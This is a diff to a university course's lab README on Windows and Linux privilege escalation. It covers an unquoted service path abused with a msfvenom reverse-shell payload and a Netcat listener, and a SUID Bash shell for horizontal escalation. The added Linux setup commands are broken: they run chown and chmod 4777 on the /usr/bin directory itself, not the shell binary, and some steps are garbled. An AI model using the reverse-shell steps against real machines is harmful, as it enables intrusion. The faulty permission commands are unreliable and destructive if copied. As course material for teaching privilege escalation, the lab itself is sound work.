@@ -10,8 +10,8 @@ Created for DSU's Cyber Operations I course
 ## Windows PrivEsc (Horizontal/Vertical)
 ### Configuration
 #### Horizontal PrivEsc via Unquoted Service Path
-1. Add an administrative user and a standard user user to the box, with different passwords. Use the administrative user for the following steps.
-2. Create a "Step 4" folder on the desktop of the administrative user.
+1. Add two additional standard users the box, with different passwords. Use the only one of the users for the following steps.
+2. Create a "Step 4" folder on the desktop of the selected user.
 3. Create a path in Program Files three folders deep with a dummy service executable (`C:\Program Files\[Level 1 Name]\[Level 2 Name]\[Dummy Service Executable]`).
      * Ensure the `Level 2 Name` contains a space (ex. `Automated Service`)
      * This dummy executable won't be used, so pretty much any executable that isn't a shell works. I used `iexplore.exe`.
@@ -34,10 +34,10 @@ Created for DSU's Cyber Operations I course
 
 ### Exploitation
 #### Horizontal PrivEsc via Unquoted Service Path
-1. Log on to the standard user.
+1. Log on to the second user created in Configuration step 1.
 2. Create a simple TCP reverse shell with `msfvenom` on the Linux Exercises box:
       * In the example above, this would be `Automated.exe`.
-      * There is a preconfigured binary with IP address 192.168.0.2 and name `Automated.exe` in the Windows PrivEsc archive in the repo.
+      * There is a preconfigured binary with the IP address of the Linux Exercises box and name `Automated.exe` in the Windows PrivEsc archive in the repo.
           * Password: `infected`
 
 ```
@@ -46,8 +46,30 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP address of Linux Exercises box> 
 
 2. SCP the generated file from the LInux Exercises box to `C:\Program Files\[Level 1 Name]` on the Windows Exercises box.
 3. Start a Netcat listener on the Linux Exercises box with `nc -nvlp 1337`.
-4. Restart the Windows Exercises box. A Windows shell should spawn in the Netcat session with the permissions of the adminsitrative user.
+4. Restart the Windows Exercises box. A Windows shell should spawn in the Netcat session with the permissions of the first user. Use `whoami` to verify this.
 
 ## Linux Horziontal PrivEsc
+### Configuration
+#### Horizontal PrivEsc via SUID
+1. Add two additional users the box, with different passwords. These users should not be able to use `sudo`. Use the only one of the users for the following steps.
+2. Create a "Step 4" folder on the desktop of the first user.
+3. Build the modified Bash shell in the Linux PrivEsc folder in the repo with `./configure` and `make`. Name it `shell`.
+      * This modification always runs the Bash shell in privileged mode (so that the SUID bit won't be ignored by default).
+      * A pre-built `shell` for the Linux Exercises box is also in the folder.
+4. Place the `shell` in the `/usr/bin` folder.
+5. Set the owner and group (if applicable) and the SUID bit on the file:
+      * If set correctly, permissions should be `-rwSrwxrwx` and the user and group will be the first user.
+
+```
+chown [first user] /usr/bin
+chgrp [first user] /usr/bin
+chmod 4777 /usr/bin
+chmod u-x /usr/bin
+```
+
+### Exploitation
+#### Horizontal PrivEsc via SUID
+1. Log on to the second user created in Configuration step 1.
+2. Execute the `/usr/bin/shell` file. A Bash shell should spawn with the permissions of the first user. Use `whoami` to verify this.
 
 ## Linux Vertical PrivEsc
